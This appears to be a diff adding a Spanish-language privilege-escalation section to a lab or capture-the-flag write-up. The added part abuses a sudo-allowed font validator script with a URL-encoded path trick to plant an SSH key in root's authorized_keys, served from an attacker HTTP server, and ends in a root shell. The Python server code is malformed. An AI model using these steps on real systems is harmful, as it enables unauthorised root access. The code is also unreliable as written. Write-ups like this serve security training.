@@ -239,4 +239,42 @@ Viendo los siguientes permisos:
  /usr/bin/python3 /opt/font-tools/install_validator.py *
 ```
 
+El cual nos permite ejecutar el script como root sin contraseña
+Generaremos las claves SSH y las movemos a tmp
+```shell
+ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
+cp /tmp/rootkey.pub /tmp/serve/authorized_keys
+```
+
+Generamos un servidor el cual suiempre sirve las claves de ssh y esta siempre en escucha en el puerto `8888` lo crearemos con python
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        with open('authorized_keys', 'rb') as f:
+            data = f.read()
+        # Sirve la clave pública como archivo
+	    self.send_response(200) self.send_header('Content-Type', 'text/plain')
+	    self.send_header('Content-Length', len(data)) 
+	    self.end_headers() 
+	    self.wfile.write(data) HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
+```
+
+Lo ejecutamos el script
+```shell
+cd /tmp/serve && python3 server.py
+```
+
+Y lo ejecutamos en la maquina victima
+```shell
+sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+  "http://YOUR_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
+```
+
+Y podremos conectarnos asi por ssh
+```shell
+ssh -i /tmp/rootkey root@TARGET_IP
+```
+
+Obteneindo una shell como root
 
